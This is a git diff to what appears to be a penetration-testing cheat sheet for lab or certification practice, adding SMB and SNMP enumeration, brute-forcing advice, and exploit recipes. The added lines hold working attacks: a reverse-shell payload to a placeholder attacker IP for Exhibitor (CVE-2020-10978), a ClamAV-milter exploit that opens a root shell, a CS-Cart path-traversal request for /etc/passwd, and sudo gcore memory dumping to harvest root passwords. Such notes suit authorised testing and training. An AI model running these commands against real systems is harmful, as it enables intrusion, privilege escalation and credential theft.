@@ -124,10 +124,19 @@ Always try multiple scan speeds and script combinations.
 ### SMB Enumeration
 Try null sessions and guest accounts first.
 
+- **List Shares & Computer Name**:
+  ```bash
+  smbclient -L [IP] -N
+  # Result: Look for 'NetBIOS computer name' or 'Server' comment
+  # Crucial for: SMTP HELO/MAIL FROM domain discovery [ClamAV]
+  ```
 - **Null Session (No credentials):**
   ```bash
   smbclient -L //10.10.10.10 -N
   rpcclient -U "" -N 10.10.10.10
+  ```
+- **Check Null Session (Shares):**
+  ```bash
   netexec smb 10.10.10.10 -u '' -p ''
   smbmap -H 10.10.10.10
   ```
@@ -205,6 +214,7 @@ Comprehensive commands for deep SNMP enumeration and logic-based exploitation.
 
 | Information Detail | Command (Using Name) | Command (Using OID / If Name Fails) |
 | :--- | :--- | :--- |
+| **Full OID Dump** | `snmpwalk -v 2c -c public [IP]` | `snmpwalk -v 2c -c public [IP] .1.3.6` |
 | **Custom Scripts** | `snmpwalk -v 2c -c public [IP] NET-SNMP-EXTEND-MIB::nsExtendObjects` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.4.1.8072.1.3` |
 | **System Info** | `snmpwalk -v 2c -c public [IP] SNMPv2-MIB::sysDescr` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.2.1.1.1` |
 | **Running Procs** | `snmpwalk -v 2c -c public [IP] HOST-RESOURCES-MIB::hrSWRunName` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.2.1.25.4.2.1.2` |
@@ -223,11 +233,17 @@ If `public` fails, try these immediately:
 
 **Discovery Tooling:**
 ```bash
-# Brute force community strings
+# Brute force community strings (The "Brute Force Everything" Rule)
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt [IP]
 # Automated enumeration
 snmp-check [IP] -c [COMMUNITY]
 ```
+
+> [!TIP]
+> **Brute Force Everything**: If standard enumeration fails, escalate to brute forcing. Use `onesixtyone` for community strings and `hydra` or `ncrack` for services. SNMP is often a goldmine for credentials hidden in `.1.3.6` dumps.
+>
+> **SNMP Version Fallback**: If `-v 2c` is slow or times out on legacy machines (Sarge/Debian 8), drop to `-v 1`:
+> `snmpwalk -v 1 -c [COMMUNITY] [IP] .1.3.6.1.2.1.25.4.2.1.2`
 
 ---
 
@@ -663,6 +679,24 @@ Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded 
   - *Context*: Found in MiniServ/Webmin GnuPG module.
   - *Payload (Key Name)*: `"; bash -c 'bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1' #`
   - *Execution*: Create the key with the payload name, then click **Sign** to trigger.
+
+- **Sendmail ClamAV-Milter Command Injection (CVE-2007-4560):**
+  - *Context*: Found in `clamav-milter` versions < 0.91.2. Injection in the `RCPT TO` field.
+  - *Discovery OID (Running Procs)*: `.1.3.6.1.2.1.25.4.2.1.2` (`hrSWRunName`).
+  - *Hostname Discovery*: `smbclient -L [IP] -N` (Look for NetBIOS Computer Name).
+  - *Exploit Logic*: Manual `RCPT TO` injection often fails stability checks; use `searchsploit -m 4761` for persistent backdoor creation via `inetd`.
+  - *Automated Trigger*: `perl 4761.pl [IP]` (Creates root shell on port 31337).
+
+- **Exhibitor Web UI RCE (CVE-2020-10978):**
+  - *Context*: Supervises ZooKeeper. Found on ports 8080 or 8081.
+  - *Method*: Config tab -> Editing ON -> `java.env script` field.
+  - *Payload*: `$(/bin/nc -e /bin/sh [KALI_IP] 4444 &)`
+  - *Trigger*: Click Commit -> All At Once.
+
+- **CS-Cart LFI (EDB-48890):**
+  - *Context*: Version 1.3.3 / `classes_dir` parameter.
+  - *Path*: `/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../etc/passwd%00`
+  - *Manual Tip*: Requires null byte `%00` for legacy PHP versions.
 
 - **Joomla Template Shell (RCE via Admin):**
   1. Extensions -> Templates -> Templates.
@@ -1229,12 +1263,13 @@ Don't get overwhelmed by searching just for "linux kernel". Most effective combi
 
 ## 5. Utilities & Post-Exploitation
 
-### Shell Stabilization
-- **Python TTY:**
-  ```bash
-  python3 -c 'import pty; pty.spawn("/bin/bash")'
-  # Then CTRL+Z, stty raw -echo; fg, reset - (Medtech)
-  ```
+### Shell Stabilization (The Perfect Sequence)
+1. **Spawn TTY**: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+2. **Background**: Hit `Ctrl + Z`
+3. **Raw Mode**: `stty raw -echo; fg`
+4. **Initialize**: Hit `Enter` once
+5. **Reset**: Type `reset` and hit `Enter`
+6. **Terminal Type**: If asked `Terminal type?`, type `xterm` and hit `Enter`
 
 ### 👤 Linux User & Auth Management (Persistence)
 - **Add Sudo User**:
@@ -1552,6 +1587,11 @@ Don't get overwhelmed by searching just for "linux kernel". Most effective combi
   sudo apt install morse2ascii
   morse2ascii hahahaha.wav
   ```
+- **Binary Code Decoding**:
+  ```bash
+  # Convert binary string (01101...) to ASCII
+  echo "01101001 01100110..." | perl -lape '$_=pack"(B8)*",@F'
+  ```
 - **Password Hashing for /etc/passwd**:
   ```bash
   openssl passwd -1 password
@@ -1580,9 +1620,18 @@ Don't get overwhelmed by searching just for "linux kernel". Most effective combi
   - `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
 - **Fix Kerberos Clock Skew (Faketime)**:
   - `faketime -f -5m impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request`
-- **Fix Failed "bash -i" (TTY Shell)**:
-  - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
-  - *Then*: `Ctrl+Z`, `stty raw -echo; fg`, `export TERM=xterm`
+
+- **Sudo gcore Memory Dumping (PrivEsc/Cred Harvest):**
+  - *Context*: If `sudo -l` allows `/usr/bin/gcore`.
+  - *Process*: `ps -u root` (Identify sensitive procs like `password-store` or `bash`).
+  - *Dump*: `sudo gcore [PID]`
+  - *Hunt*: `strings core.[PID] | grep -iE "pass|user|root|secret"`
+  - *Note*: Use `grep -A 5 "Password:"` to find multi-line secrets.
+
+- **SSH Legacy Algorithm Fixes:**
+  - *Problem*: Modern SSH clients reject older servers (`kex error : no match for method mac algo`).
+  - *Command*: `ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o MACs=hmac-sha1 -o HostKeyAlgorithms=+ssh-rsa [USER]@[IP]`
+  - *Hydra Configuration*: Add `KexAlgorithms +diffie-hellman-group1-sha1`, etc., to `~/.ssh/config`.
 
 ---
 
